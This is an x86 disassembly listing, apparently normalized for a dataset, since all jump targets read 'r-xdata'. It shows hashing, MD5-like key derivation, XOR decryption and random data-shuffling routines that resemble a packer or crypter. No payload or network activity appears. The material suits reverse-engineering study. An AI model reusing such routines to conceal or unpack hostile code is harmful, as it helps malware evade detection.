sub_401000
push ebp
mov ebp esp
xor ecx ecx
mov eax 0x1505
cmp [ ebp + 0xc ] ecx
jbe r-xdata
pop ebp
retn
mov edx [ ebp + 0x8 ]
imul eax eax 0x21
movzx edx [ ecx + edx ]
add eax edx
inc ecx
cmp ecx [ ebp + 0xc ]
jb r-xdata
sub_401023
push ebp
mov ebp esp
sub esp 0xc
mov edx 0x1505
xor ecx ecx
push ebx
mov [ ebp - 0x4 ] edx
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x45872367
mov [ ebp - 0xc ] 0x1984
mov ebx [ ebp - 0x4 ]
movzx eax [ ecx + esi ]
imul ebx ebx 0x21
add eax ebx
inc ecx
mov [ ebp - 0x4 ] eax
cmp ecx edi
jb r-xdata
movzx ebx [ ebp + ecx - 0x8 ]
imul eax eax 0x21
add eax ebx
inc ecx
cmp ecx 0x4
jb r-xdata
dec [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
jne r-xdata
mov eax edx
xor ecx ecx
pop ebx
cmp eax 0x7ccf27b6
jne r-xdata
mov eax esi
leave
retn
xor edx edx
test edi edi
je r-xdata
mov cl [ ebp - 0x4 ]
shr [ edx + esi ] cl
inc edx
cmp edx edi
jb r-xdata
sub_401093
mov eax [ eax ]
push ebx
push edi
lea edi [ eax - 0x1 ]
xor ecx ecx
test edi edi
je r-xdata
mov al 0x1
mov al [ ecx + esi ]
push 0x5
pop ebx
test al al
jne r-xdata
movzx eax al
cdq
idiv ebx
test edx edx
je r-xdata
movzx eax [ ecx + esi + 0x1 ]
cdq
idiv ebx
test edx edx
jne r-xdata
xor al al
jmp r-xdata
inc ecx
add ecx 0x2
jmp r-xdata
pop edi
pop ebx
retn
cmp ecx edi
jb r-xdata
sub_4010d3
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ eax ]
lea eax [ ebx - 0x1 ]
xor ecx ecx
push esi
test eax eax
je r-xdata
push ebx
xor esi esi
call sub_424f00
pop ecx
xor ecx ecx
test ebx ebx
je r-xdata
mov al [ ecx + edi ]
push 0x5
pop esi
test al al
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] esi
mov edx [ ebp + 0x8 ]
mov ebx [ edx ]
movzx eax al
cdq
idiv esi
test edx edx
je r-xdata
movzx eax [ ecx + edi + 0x1 ]
cdq
idiv esi
test edx edx
jne r-xdata
mov [ eax + esi ] dl
inc esi
inc ecx
cmp ecx ebx
jb r-xdata
inc ecx
mov dl [ ecx + edi ]
mov eax edi
jmp r-xdata
inc ecx
add ecx 0x2
jmp r-xdata
mov dl [ ecx + edi ]
test dl dl
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
dec eax
cmp ecx eax
jb r-xdata
sub_40114b
push ebp
mov ebp esp
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov [ ebp - 0x60 ] eax
mov eax [ ebp + 0x10 ]
push edi
mov [ ebp - 0x5c ] eax
xor esi esi
call sub_424fa6
mov [ ebp + esi * 4 - 0x44 ] eax
inc esi
cmp esi 0x10
jl r-xdata
mov edi 0x22334455
mov [ ebp - 0x54 ] 0x11223344
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x4c ] 0x33445566
mov [ ebp - 0x48 ] 0x44556677
mov [ ebp - 0x58 ] 0x64
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x4c ]
mov esi [ ebp - 0x54 ]
mov eax ecx
xor eax edx
and eax edi
xor eax ecx
add eax [ ebp - 0x44 ]
lea eax [ eax + esi - 0x28955b88 ]
rol eax 0x7
add eax edi
mov esi edx
xor esi edi
and esi eax
xor esi edx
add esi [ ebp - 0x40 ]
lea ecx [ esi + ecx - 0x173848aa ]
rol ecx 0xc
add ecx eax
mov esi eax
xor esi edi
and esi ecx
xor esi edi
add esi [ ebp - 0x3c ]
lea edx [ esi + edx + 0x242070db ]
ror edx 0xf
add edx ecx
mov esi ecx
xor esi eax
and esi edx
xor esi eax
add esi [ ebp - 0x38 ]
lea esi [ esi + edi - 0x3e423112 ]
ror esi 0xa
add esi edx
mov edi ecx
xor edi edx
and edi esi
xor edi ecx
add edi [ ebp - 0x34 ]
lea eax [ edi + eax - 0xa83f051 ]
rol eax 0x7
add eax esi
mov edi edx
xor edi esi
and edi eax
xor edi edx
add edi [ ebp - 0x30 ]
lea ecx [ edi + ecx + 0x4787c62a ]
rol ecx 0xc
add ecx eax
mov edi esi
xor edi eax
and edi ecx
xor edi esi
add edi [ ebp - 0x2c ]
lea edx [ edi + edx - 0x57cfb9ed ]
ror edx 0xf
add edx ecx
mov edi ecx
xor edi eax
and edi edx
xor edi eax
add edi [ ebp - 0x28 ]
lea esi [ edi + esi - 0x2b96aff ]
ror esi 0xa
add esi edx
mov edi ecx
xor edi edx
and edi esi
xor edi ecx
add edi [ ebp - 0x24 ]
lea eax [ edi + eax + 0x698098d8 ]
rol eax 0x7
mov edi edx
xor edi esi
add eax esi
and edi eax
xor edi edx
add edi [ ebp - 0x20 ]
lea ecx [ edi + ecx - 0x74bb0851 ]
rol ecx 0xc
add ecx eax
mov edi esi
xor edi eax
and edi ecx
xor edi esi
add edi [ ebp - 0x1c ]
lea edx [ edi + edx - 0xa44f ]
ror edx 0xf
add edx ecx
mov edi ecx
xor edi eax
and edi edx
xor edi eax
add edi [ ebp - 0x18 ]
lea esi [ edi + esi - 0x76a32842 ]
ror esi 0xa
add esi edx
mov edi ecx
xor edi edx
and edi esi
xor edi ecx
add edi [ ebp - 0x14 ]
lea eax [ edi + eax + 0x6b901122 ]
rol eax 0x7
add eax esi
mov edi edx
xor edi esi
and edi eax
xor edi edx
add edi [ ebp - 0x10 ]
lea ecx [ edi + ecx - 0x2678e6d ]
rol ecx 0xc
add ecx eax
mov edi esi
xor edi eax
and edi ecx
xor edi esi
add edi [ ebp - 0xc ]
lea edx [ edi + edx - 0x5986bc72 ]
ror edx 0xf
add edx ecx
mov edi ecx
xor edi eax
and edi edx
xor edi eax
add edi [ ebp - 0x8 ]
lea esi [ edi + esi + 0x49b40821 ]
ror esi 0xa
add esi edx
mov edi edx
xor edi esi
and edi ecx
xor edi edx
add edi [ ebp - 0x40 ]
lea eax [ edi + eax - 0x9e1da9e ]
rol eax 0x5
add eax esi
mov edi esi
xor edi eax
and edi edx
xor edi esi
add edi [ ebp - 0x2c ]
lea ecx [ edi + ecx - 0x3fbf4cc0 ]
rol ecx 0x9
add ecx eax
mov edi ecx
xor edi eax
and edi esi
xor edi eax
add edi [ ebp - 0x18 ]
lea edx [ edi + edx + 0x265e5a51 ]
rol edx 0xe
add edx ecx
mov edi ecx
xor edi edx
and edi eax
xor edi ecx
add edi [ ebp - 0x44 ]
lea esi [ edi + esi - 0x16493856 ]
ror esi 0xc
add esi edx
mov edi edx
xor edi esi
and edi ecx
xor edi edx
add edi [ ebp - 0x30 ]
lea eax [ edi + eax - 0x29d0efa3 ]
rol eax 0x5
add eax esi
mov edi esi
xor edi eax
and edi edx
xor edi esi
add edi [ ebp - 0x1c ]
lea ecx [ edi + ecx + 0x2441453 ]
rol ecx 0x9
add ecx eax
mov edi ecx
xor edi eax
and edi esi
xor edi eax
add edi [ ebp - 0x8 ]
lea edx [ edi + edx - 0x275e197f ]
rol edx 0xe
add edx ecx
mov edi ecx
xor edi edx
and edi eax
xor edi ecx
add edi [ ebp - 0x34 ]
lea esi [ edi + esi - 0x182c0438 ]
ror esi 0xc
add esi edx
mov edi edx
xor edi esi
and edi ecx
xor edi edx
add edi [ ebp - 0x20 ]
lea eax [ edi + eax + 0x21e1cde6 ]
rol eax 0x5
add eax esi
mov edi esi
xor edi eax
and edi edx
xor edi esi
add edi [ ebp - 0xc ]
lea ecx [ edi + ecx - 0x3cc8f82a ]
rol ecx 0x9
add ecx eax
mov edi ecx
xor edi eax
and edi esi
xor edi eax
add edi [ ebp - 0x38 ]
lea edx [ edi + edx - 0xb2af279 ]
rol edx 0xe
add edx ecx
mov edi ecx
xor edi edx
and edi eax
xor edi ecx
add edi [ ebp - 0x24 ]
lea esi [ edi + esi + 0x455a14ed ]
ror esi 0xc
add esi edx
mov edi edx
xor edi esi
and edi ecx
xor edi edx
add edi [ ebp - 0x10 ]
lea eax [ edi + eax - 0x561c16fb ]
rol eax 0x5
add eax esi
mov edi esi
xor edi eax
and edi edx
xor edi esi
add edi [ ebp - 0x3c ]
lea ecx [ edi + ecx - 0x3105c08 ]
rol ecx 0x9
add ecx eax
mov edi ecx
xor edi eax
and edi esi
xor edi eax
add edi [ ebp - 0x28 ]
lea edx [ edi + edx + 0x676f02d9 ]
rol edx 0xe
add edx ecx
mov edi ecx
xor edi edx
mov ebx edi
and ebx eax
xor ebx ecx
add ebx [ ebp - 0x14 ]
lea esi [ ebx + esi - 0x72d5b376 ]
ror esi 0xc
add esi edx
xor edi esi
add edi [ ebp - 0x30 ]
lea eax [ edi + eax - 0x5c6be ]
rol eax 0x4
add eax esi
mov edi edx
xor edi esi
xor edi eax
add edi [ ebp - 0x24 ]
lea ecx [ edi + ecx - 0x788e097f ]
rol ecx 0xb
add ecx eax
mov edi ecx
xor edi esi
xor edi eax
add edi [ ebp - 0x18 ]
mov ebx ecx
lea edi [ edi + edx + 0x6d9d6122 ]
rol edi 0x10
add edi ecx
xor ebx edi
mov edx ebx
xor edx eax
add edx [ ebp - 0xc ]
lea edx [ edx + esi - 0x21ac7f4 ]
ror edx 0x9
add edx edi
xor ebx edx
add ebx [ ebp - 0x40 ]
mov esi edi
lea eax [ ebx + eax - 0x5b4115bc ]
xor esi edx
rol eax 0x4
add eax edx
xor esi eax
add esi [ ebp - 0x34 ]
lea esi [ esi + ecx + 0x4bdecfa9 ]
rol esi 0xb
add esi eax
mov ecx esi
xor ecx edx
xor ecx eax
add ecx [ ebp - 0x28 ]
mov ebx esi
lea edi [ ecx + edi - 0x944b4a0 ]
rol edi 0x10
add edi esi
xor ebx edi
mov ecx ebx
xor ecx eax
add ecx [ ebp - 0x1c ]
lea ecx [ ecx + edx - 0x41404390 ]
ror ecx 0x9
add ecx edi
xor ebx ecx
add ebx [ ebp - 0x10 ]
mov edx edi
lea eax [ ebx + eax + 0x289b7ec6 ]
rol eax 0x4
xor edx ecx
add eax ecx
xor edx eax
add edx [ ebp - 0x44 ]
lea edx [ edx + esi - 0x155ed806 ]
rol edx 0xb
add edx eax
mov esi edx
xor esi ecx
xor esi eax
add esi [ ebp - 0x38 ]
lea esi [ esi + edi - 0x2b10cf7b ]
rol esi 0x10
add esi edx
mov edi edx
xor edi esi
mov ebx edi
xor ebx eax
add ebx [ ebp - 0x2c ]
lea ecx [ ebx + ecx + 0x4881d05 ]
ror ecx 0x9
add ecx esi
xor edi ecx
add edi [ ebp - 0x20 ]
lea eax [ edi + eax - 0x262b2fc7 ]
rol eax 0x4
add eax ecx
mov edi esi
xor edi ecx
xor edi eax
add edi [ ebp - 0x14 ]
lea edx [ edi + edx - 0x1924661b ]
rol edx 0xb
add edx eax
mov edi edx
xor edi ecx
xor edi eax
add edi [ ebp - 0x8 ]
lea esi [ edi + esi + 0x1fa27cf8 ]
rol esi 0x10
add esi edx
mov edi edx
xor edi esi
xor edi eax
add edi [ ebp - 0x3c ]
lea ecx [ edi + ecx - 0x3b53a99b ]
ror ecx 0x9
add ecx esi
mov edi edx
not edi
or edi ecx
xor edi esi
add edi [ ebp - 0x44 ]
lea eax [ edi + eax - 0xbd6ddbc ]
rol eax 0x6
add eax ecx
mov edi esi
not edi
or edi eax
xor edi ecx
add edi [ ebp - 0x28 ]
lea edx [ edi + edx + 0x432aff97 ]
rol edx 0xa
add edx eax
mov edi ecx
not edi
or edi edx
xor edi eax
add edi [ ebp - 0xc ]
lea esi [ edi + esi - 0x546bdc59 ]
rol esi 0xf
add esi edx
mov edi eax
not edi
or edi esi
xor edi edx
add edi [ ebp - 0x30 ]
lea ecx [ edi + ecx - 0x36c5fc7 ]
ror ecx 0xb
mov edi edx
not edi
add ecx esi
or edi ecx
xor edi esi
add edi [ ebp - 0x14 ]
lea eax [ edi + eax + 0x655b59c3 ]
rol eax 0x6
add eax ecx
mov edi esi
not edi
or edi eax
xor edi ecx
add edi [ ebp - 0x38 ]
lea edx [ edi + edx - 0x70f3336e ]
rol edx 0xa
add edx eax
mov edi ecx
not edi
or edi edx
xor edi eax
add edi [ ebp - 0x1c ]
lea esi [ edi + esi - 0x100b83 ]
rol esi 0xf
add esi edx
mov edi eax
not edi
or edi esi
xor edi edx
add edi [ ebp - 0x40 ]
lea ecx [ edi + ecx - 0x7a7ba22f ]
ror ecx 0xb
add ecx esi
mov edi edx
not edi
or edi ecx
xor edi esi
add edi [ ebp - 0x24 ]
lea eax [ edi + eax + 0x6fa87e4f ]
rol eax 0x6
add eax ecx
mov edi esi
not edi
or edi eax
xor edi ecx
add edi [ ebp - 0x8 ]
lea edx [ edi + edx - 0x1d31920 ]
rol edx 0xa
add edx eax
mov edi ecx
not edi
or edi edx
xor edi eax
add edi [ ebp - 0x2c ]
lea esi [ edi + esi - 0x5cfebcec ]
rol esi 0xf
add esi edx
mov edi eax
not edi
or edi esi
xor edi edx
add edi [ ebp - 0x10 ]
lea ecx [ edi + ecx + 0x4e0811a1 ]
ror ecx 0xb
add ecx esi
mov edi edx
not edi
or edi ecx
xor edi esi
add edi [ ebp - 0x34 ]
lea eax [ edi + eax - 0x8ac817e ]
rol eax 0x6
add eax ecx
mov edi esi
not edi
or edi eax
xor edi ecx
add edi [ ebp - 0x18 ]
lea edx [ edi + edx - 0x42c50dcb ]
rol edx 0xa
mov edi ecx
not edi
add edx eax
or edi edx
xor edi eax
add edi [ ebp - 0x3c ]
lea esi [ edi + esi + 0x2ad7d2bb ]
rol esi 0xf
add [ ebp - 0x54 ] eax
add [ ebp - 0x48 ] edx
add esi edx
add [ ebp - 0x4c ] esi
mov edi eax
not edi
or edi esi
xor edi edx
add edi [ ebp - 0x20 ]
lea ecx [ edi + ecx - 0x14792c6f ]
mov edi [ ebp - 0x50 ]
ror ecx 0xb
add ecx esi
add edi ecx
dec [ ebp - 0x58 ]
mov [ ebp - 0x50 ] edi
jne r-xdata
mov ebx [ ebp - 0x60 ]
lea esi [ ebx + 0x40 ]
push esi
call sub_424f00
mov edi eax
push 0x40
lea eax [ ebp - 0x44 ]
push eax
push edi
call sub_4247f0
add esp 0x10
xor eax eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x4 ]
mov [ eax ] esi
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
mov ecx eax
and ecx 0x8000000f
jns r-xdata
mov cl [ ebp + ecx - 0x54 ]
mov edx [ ebp + 0x8 ]
xor cl [ eax + edx ]
inc eax
mov [ edi + eax + 0x3f ] cl
cmp eax ebx
jb r-xdata
dec ecx
or ecx 0xfffffff0
inc ecx
sub_4017b5
push ebp
mov ebp esp
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov esi ecx
push 0x10
pop ecx
lea edi [ ebp - 0x44 ]
mov [ ebp - 0x58 ] esi
[ edi ] [ esi ]
mov edi 0x22334455
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x54 ] 0x11223344
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x4c ] 0x33445566
mov [ ebp - 0x48 ] 0x44556677
mov [ ebp - 0x5c ] 0x64
push ebx
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x4c ]
mov esi [ ebp - 0x54 ]
mov eax ecx
xor eax edx
and eax edi
xor eax ecx
add eax [ ebp - 0x44 ]
lea eax [ eax + esi - 0x28955b88 ]
rol eax 0x7
add eax edi
mov esi edx
xor esi edi
and esi eax
xor esi edx
add esi [ ebp - 0x40 ]
lea ecx [ esi + ecx - 0x173848aa ]
rol ecx 0xc
add ecx eax
mov esi eax
xor esi edi
and esi ecx
xor esi edi
add esi [ ebp - 0x3c ]
lea edx [ esi + edx + 0x242070db ]
ror edx 0xf
add edx ecx
mov esi ecx
xor esi eax
and esi edx
xor esi eax
add esi [ ebp - 0x38 ]
lea esi [ esi + edi - 0x3e423112 ]
ror esi 0xa
add esi edx
mov edi ecx
xor edi edx
and edi esi
xor edi ecx
add edi [ ebp - 0x34 ]
lea eax [ edi + eax - 0xa83f051 ]
rol eax 0x7
add eax esi
mov edi edx
xor edi esi
and edi eax
xor edi edx
add edi [ ebp - 0x30 ]
lea ecx [ edi + ecx + 0x4787c62a ]
rol ecx 0xc
add ecx eax
mov edi esi
xor edi eax
and edi ecx
xor edi esi
add edi [ ebp - 0x2c ]
lea edx [ edi + edx - 0x57cfb9ed ]
ror edx 0xf
add edx ecx
mov edi ecx
xor edi eax
and edi edx
xor edi eax
add edi [ ebp - 0x28 ]
lea esi [ edi + esi - 0x2b96aff ]
ror esi 0xa
add esi edx
mov edi ecx
xor edi edx
and edi esi
xor edi ecx
add edi [ ebp - 0x24 ]
lea eax [ edi + eax + 0x698098d8 ]
rol eax 0x7
mov edi edx
xor edi esi
add eax esi
and edi eax
xor edi edx
add edi [ ebp - 0x20 ]
lea ecx [ edi + ecx - 0x74bb0851 ]
rol ecx 0xc
add ecx eax
mov edi esi
xor edi eax
and edi ecx
xor edi esi
add edi [ ebp - 0x1c ]
lea edx [ edi + edx - 0xa44f ]
ror edx 0xf
add edx ecx
mov edi ecx
xor edi eax
and edi edx
xor edi eax
add edi [ ebp - 0x18 ]
lea esi [ edi + esi - 0x76a32842 ]
ror esi 0xa
add esi edx
mov edi ecx
xor edi edx
and edi esi
xor edi ecx
add edi [ ebp - 0x14 ]
lea eax [ edi + eax + 0x6b901122 ]
rol eax 0x7
add eax esi
mov edi edx
xor edi esi
and edi eax
xor edi edx
add edi [ ebp - 0x10 ]
lea ecx [ edi + ecx - 0x2678e6d ]
rol ecx 0xc
add ecx eax
mov edi esi
xor edi eax
and edi ecx
xor edi esi
add edi [ ebp - 0xc ]
lea edx [ edi + edx - 0x5986bc72 ]
ror edx 0xf
add edx ecx
mov edi ecx
xor edi eax
and edi edx
xor edi eax
add edi [ ebp - 0x8 ]
lea esi [ edi + esi + 0x49b40821 ]
ror esi 0xa
add esi edx
mov edi edx
xor edi esi
and edi ecx
xor edi edx
add edi [ ebp - 0x40 ]
lea eax [ edi + eax - 0x9e1da9e ]
rol eax 0x5
add eax esi
mov edi esi
xor edi eax
and edi edx
xor edi esi
add edi [ ebp - 0x2c ]
lea ecx [ edi + ecx - 0x3fbf4cc0 ]
rol ecx 0x9
add ecx eax
mov edi ecx
xor edi eax
and edi esi
xor edi eax
add edi [ ebp - 0x18 ]
lea edx [ edi + edx + 0x265e5a51 ]
rol edx 0xe
add edx ecx
mov edi ecx
xor edi edx
and edi eax
xor edi ecx
add edi [ ebp - 0x44 ]
lea esi [ edi + esi - 0x16493856 ]
ror esi 0xc
add esi edx
mov edi edx
xor edi esi
and edi ecx
xor edi edx
add edi [ ebp - 0x30 ]
lea eax [ edi + eax - 0x29d0efa3 ]
rol eax 0x5
add eax esi
mov edi esi
xor edi eax
and edi edx
xor edi esi
add edi [ ebp - 0x1c ]
lea ecx [ edi + ecx + 0x2441453 ]
rol ecx 0x9
add ecx eax
mov edi ecx
xor edi eax
and edi esi
xor edi eax
add edi [ ebp - 0x8 ]
lea edx [ edi + edx - 0x275e197f ]
rol edx 0xe
add edx ecx
mov edi ecx
xor edi edx
and edi eax
xor edi ecx
add edi [ ebp - 0x34 ]
lea esi [ edi + esi - 0x182c0438 ]
ror esi 0xc
add esi edx
mov edi edx
xor edi esi
and edi ecx
xor edi edx
add edi [ ebp - 0x20 ]
lea eax [ edi + eax + 0x21e1cde6 ]
rol eax 0x5
add eax esi
mov edi esi
xor edi eax
and edi edx
xor edi esi
add edi [ ebp - 0xc ]
lea ecx [ edi + ecx - 0x3cc8f82a ]
rol ecx 0x9
add ecx eax
mov edi ecx
xor edi eax
and edi esi
xor edi eax
add edi [ ebp - 0x38 ]
lea edx [ edi + edx - 0xb2af279 ]
rol edx 0xe
add edx ecx
mov edi ecx
xor edi edx
and edi eax
xor edi ecx
add edi [ ebp - 0x24 ]
lea esi [ edi + esi + 0x455a14ed ]
ror esi 0xc
add esi edx
mov edi edx
xor edi esi
and edi ecx
xor edi edx
add edi [ ebp - 0x10 ]
lea eax [ edi + eax - 0x561c16fb ]
rol eax 0x5
add eax esi
mov edi esi
xor edi eax
and edi edx
xor edi esi
add edi [ ebp - 0x3c ]
lea ecx [ edi + ecx - 0x3105c08 ]
rol ecx 0x9
add ecx eax
mov edi ecx
xor edi eax
and edi esi
xor edi eax
add edi [ ebp - 0x28 ]
lea edx [ edi + edx + 0x676f02d9 ]
rol edx 0xe
add edx ecx
mov edi ecx
xor edi edx
mov ebx edi
and ebx eax
xor ebx ecx
add ebx [ ebp - 0x14 ]
lea esi [ ebx + esi - 0x72d5b376 ]
ror esi 0xc
add esi edx
xor edi esi
add edi [ ebp - 0x30 ]
lea eax [ edi + eax - 0x5c6be ]
rol eax 0x4
add eax esi
mov edi edx
xor edi esi
xor edi eax
add edi [ ebp - 0x24 ]
lea ecx [ edi + ecx - 0x788e097f ]
rol ecx 0xb
add ecx eax
mov edi ecx
xor edi esi
xor edi eax
add edi [ ebp - 0x18 ]
mov ebx ecx
lea edi [ edi + edx + 0x6d9d6122 ]
rol edi 0x10
add edi ecx
xor ebx edi
mov edx ebx
xor edx eax
add edx [ ebp - 0xc ]
lea edx [ edx + esi - 0x21ac7f4 ]
ror edx 0x9
add edx edi
xor ebx edx
add ebx [ ebp - 0x40 ]
mov esi edi
lea eax [ ebx + eax - 0x5b4115bc ]
xor esi edx
rol eax 0x4
add eax edx
xor esi eax
add esi [ ebp - 0x34 ]
lea esi [ esi + ecx + 0x4bdecfa9 ]
rol esi 0xb
add esi eax
mov ecx esi
xor ecx edx
xor ecx eax
add ecx [ ebp - 0x28 ]
mov ebx esi
lea edi [ ecx + edi - 0x944b4a0 ]
rol edi 0x10
add edi esi
xor ebx edi
mov ecx ebx
xor ecx eax
add ecx [ ebp - 0x1c ]
lea ecx [ ecx + edx - 0x41404390 ]
ror ecx 0x9
add ecx edi
xor ebx ecx
add ebx [ ebp - 0x10 ]
mov edx edi
lea eax [ ebx + eax + 0x289b7ec6 ]
rol eax 0x4
xor edx ecx
add eax ecx
xor edx eax
add edx [ ebp - 0x44 ]
lea edx [ edx + esi - 0x155ed806 ]
rol edx 0xb
add edx eax
mov esi edx
xor esi ecx
xor esi eax
add esi [ ebp - 0x38 ]
lea esi [ esi + edi - 0x2b10cf7b ]
rol esi 0x10
add esi edx
mov edi edx
xor edi esi
mov ebx edi
xor ebx eax
add ebx [ ebp - 0x2c ]
lea ecx [ ebx + ecx + 0x4881d05 ]
ror ecx 0x9
add ecx esi
xor edi ecx
add edi [ ebp - 0x20 ]
lea eax [ edi + eax - 0x262b2fc7 ]
rol eax 0x4
add eax ecx
mov edi esi
xor edi ecx
xor edi eax
add edi [ ebp - 0x14 ]
lea edx [ edi + edx - 0x1924661b ]
rol edx 0xb
add edx eax
mov edi edx
xor edi ecx
xor edi eax
add edi [ ebp - 0x8 ]
lea esi [ edi + esi + 0x1fa27cf8 ]
rol esi 0x10
add esi edx
mov edi edx
xor edi esi
xor edi eax
add edi [ ebp - 0x3c ]
lea ecx [ edi + ecx - 0x3b53a99b ]
ror ecx 0x9
add ecx esi
mov edi edx
not edi
or edi ecx
xor edi esi
add edi [ ebp - 0x44 ]
lea eax [ edi + eax - 0xbd6ddbc ]
rol eax 0x6
add eax ecx
mov edi esi
not edi
or edi eax
xor edi ecx
add edi [ ebp - 0x28 ]
lea edx [ edi + edx + 0x432aff97 ]
rol edx 0xa
add edx eax
mov edi ecx
not edi
or edi edx
xor edi eax
add edi [ ebp - 0xc ]
lea esi [ edi + esi - 0x546bdc59 ]
rol esi 0xf
add esi edx
mov edi eax
not edi
or edi esi
xor edi edx
add edi [ ebp - 0x30 ]
lea ecx [ edi + ecx - 0x36c5fc7 ]
ror ecx 0xb
mov edi edx
not edi
add ecx esi
or edi ecx
xor edi esi
add edi [ ebp - 0x14 ]
lea eax [ edi + eax + 0x655b59c3 ]
rol eax 0x6
add eax ecx
mov edi esi
not edi
or edi eax
xor edi ecx
add edi [ ebp - 0x38 ]
lea edx [ edi + edx - 0x70f3336e ]
rol edx 0xa
add edx eax
mov edi ecx
not edi
or edi edx
xor edi eax
add edi [ ebp - 0x1c ]
lea esi [ edi + esi - 0x100b83 ]
rol esi 0xf
add esi edx
mov edi eax
not edi
or edi esi
xor edi edx
add edi [ ebp - 0x40 ]
lea ecx [ edi + ecx - 0x7a7ba22f ]
ror ecx 0xb
add ecx esi
mov edi edx
not edi
or edi ecx
xor edi esi
add edi [ ebp - 0x24 ]
lea eax [ edi + eax + 0x6fa87e4f ]
rol eax 0x6
add eax ecx
mov edi esi
not edi
or edi eax
xor edi ecx
add edi [ ebp - 0x8 ]
lea edx [ edi + edx - 0x1d31920 ]
rol edx 0xa
add edx eax
mov edi ecx
not edi
or edi edx
xor edi eax
add edi [ ebp - 0x2c ]
lea esi [ edi + esi - 0x5cfebcec ]
rol esi 0xf
add esi edx
mov edi eax
not edi
or edi esi
xor edi edx
add edi [ ebp - 0x10 ]
lea ecx [ edi + ecx + 0x4e0811a1 ]
ror ecx 0xb
add ecx esi
mov edi edx
not edi
or edi ecx
xor edi esi
add edi [ ebp - 0x34 ]
lea eax [ edi + eax - 0x8ac817e ]
rol eax 0x6
add eax ecx
mov edi esi
not edi
or edi eax
xor edi ecx
add edi [ ebp - 0x18 ]
lea edx [ edi + edx - 0x42c50dcb ]
rol edx 0xa
mov edi ecx
not edi
add edx eax
or edi edx
xor edi eax
add edi [ ebp - 0x3c ]
lea esi [ edi + esi + 0x2ad7d2bb ]
rol esi 0xf
add [ ebp - 0x54 ] eax
add [ ebp - 0x48 ] edx
add esi edx
add [ ebp - 0x4c ] esi
mov edi eax
not edi
or edi esi
xor edi edx
add edi [ ebp - 0x20 ]
lea ecx [ edi + ecx - 0x14792c6f ]
mov edi [ ebp - 0x50 ]
ror ecx 0xb
add ecx esi
add edi ecx
dec [ ebp - 0x5c ]
mov [ ebp - 0x50 ] edi
jne r-xdata
mov esi [ ebp + 0x8 ]
push 0x40
pop ecx
pop ebx
cmp esi ecx
jbe r-xdata
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x4 ]
add esi 0xffffffc0
mov [ eax ] esi
mov eax [ ebp - 0x58 ]
pop edi
xor ecx ebp
add eax 0x40
pop esi
call sub_4247dc
leave
retn
mov eax [ ebp - 0x58 ]
mov edx ecx
and edx 0x8000000f
jns r-xdata
mov dl [ ebp + edx - 0x54 ]
xor [ eax + ecx ] dl
inc ecx
cmp ecx esi
jb r-xdata
dec edx
or edx 0xfffffff0
inc edx
sub_401dff
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x48 ] eax
xor ebx ebx
inc ebx
cmp ebx 0x2a
jl r-xdata
cmp eax ebx
jge r-xdata
lea edi [ ebp + ebx - 0x44 ]
call sub_424fa6
cdq
push 0x2a
pop ecx
idiv ecx
xor eax eax
mov [ edi ] dl
test ebx ebx
je r-xdata
push 0x2a
mov eax esi
pop ecx
xor edx edx
div ecx
mov ebx [ ebp - 0x48 ]
mov [ ebp - 0x8 ] esi
sub esi edx
add esi 0x6a
push esi
mov [ ebx ] esi
call sub_424f00
mov edi eax
push 0x40
lea eax [ ebp - 0x44 ]
push eax
push edi
call sub_4247f0
add esp 0x10
xor ecx ecx
add esi 0xffffffc0
je r-xdata
mov cl [ ebp + eax - 0x44 ]
cmp cl [ edi ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
mov esi [ ebx ]
add esi 0xffffffc0
inc eax
jmp r-xdata
call sub_424fa6
cdq
push 0x2a
pop ecx
idiv ecx
xor eax eax
mov [ edi ] dl
jmp r-xdata
mov eax ecx
cdq
push 0x2a
pop ebx
idiv ebx
movzx eax [ ebp + edx - 0x44 ]
sub eax edx
mov edx [ ebp + 0x8 ]
add eax ecx
mov al [ eax + edx ]
mov [ edi + ecx + 0x40 ] al
inc ecx
cmp ecx esi
jb r-xdata
sub_401ec3
push ebp
mov ebp esp
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push edi
push 0x2a
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x44 ]
mov ebx ecx
push esi
push eax
mov [ ebp - 0x50 ] ebx
call sub_4247f0
mov edi [ esi + 0x3c ]
push [ ebp - 0x48 ]
mov [ ebx ] edi
call sub_424f00
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x48 ]
add esp 0x10
xor ecx ecx
add eax 0xffffffc0
mov [ ebp - 0x48 ] eax
je r-xdata
xor eax eax
test edi edi
je r-xdata
mov eax ecx
cdq
push 0x2a
pop ebx
idiv ebx
movzx eax [ ebp + edx - 0x44 ]
sub eax edx
add eax [ ebp - 0x4c ]
mov dl [ esi + ecx + 0x40 ]
mov [ eax + ecx + 0x40 ] dl
inc ecx
cmp ecx [ ebp - 0x48 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax esi
pop ebx
call sub_4247dc
leave
retn
mov ecx [ ebp - 0x4c ]
